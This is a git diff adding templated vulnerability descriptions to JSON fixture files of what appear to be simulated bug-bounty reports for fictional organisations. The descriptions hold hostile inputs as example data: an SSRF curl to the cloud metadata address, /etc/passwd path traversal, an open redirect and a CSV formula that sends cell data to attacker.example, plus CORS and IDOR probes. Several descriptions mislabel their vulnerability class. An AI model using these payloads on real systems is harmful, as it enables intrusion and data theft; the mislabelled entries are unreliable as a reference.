+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13402,7 +13505,8 @@
           "offset": "3d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13549,7 +13653,8 @@
           "offset": "2d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13725,7 +13830,8 @@
           "offset": "8d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13865,7 +13971,8 @@
           "offset": "6d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14000,7 +14107,8 @@
           "offset": "4d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14141,7 +14249,8 @@
           "offset": "4d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14304,7 +14413,8 @@
           "offset": "5d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14464,7 +14574,8 @@
           "offset": "8d 9h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14578,7 +14689,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14706,7 +14818,8 @@
           "offset": "5d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14805,7 +14918,8 @@
           "offset": "4d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14935,7 +15049,8 @@
           "offset": "21h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15087,7 +15202,8 @@
           "offset": "2d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15199,7 +15315,8 @@
           "offset": "4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15391,7 +15508,8 @@
           "offset": "8d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/laerchenquell_foods_reports.json b/fixtures/reports/laerchenquell_foods_reports.json
index 08fc5bc..4db4254 100644
--- a/fixtures/reports/laerchenquell_foods_reports.json
+++ b/fixtures/reports/laerchenquell_foods_reports.json
@@ -46,7 +46,8 @@
           "offset": "2d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "Supplier export writes unescaped values; cells beginning with '=' are interpreted as formulas when opened in spreadsheet apps.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: procurement admin; app version: Suppliers 2.4\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create supplier with name '=HYPERLINK(\"https://evil.foo\",\"click\")'\n- Export CSV and open in Excel; link executes\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -187,7 +188,8 @@
           "offset": "6d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -335,7 +337,8 @@
           "offset": "4d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -510,7 +513,8 @@
           "offset": "6d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -604,7 +608,8 @@
           "offset": "2d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -764,7 +769,8 @@
           "offset": "6d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.laerchenquell-foods.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -896,7 +902,8 @@
           "offset": "5d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.laerchenquell-foods.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1028,7 +1035,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1174,7 +1182,8 @@
           "offset": "2d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1295,7 +1304,8 @@
           "offset": "4d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1402,7 +1412,8 @@
           "offset": "3d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1513,7 +1524,8 @@
           "offset": "2d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.laerchenquell-foods.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1679,7 +1691,8 @@
           "offset": "8d 5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1815,7 +1828,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1957,7 +1971,8 @@
           "offset": "8d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2068,7 +2083,8 @@
           "offset": "11h",
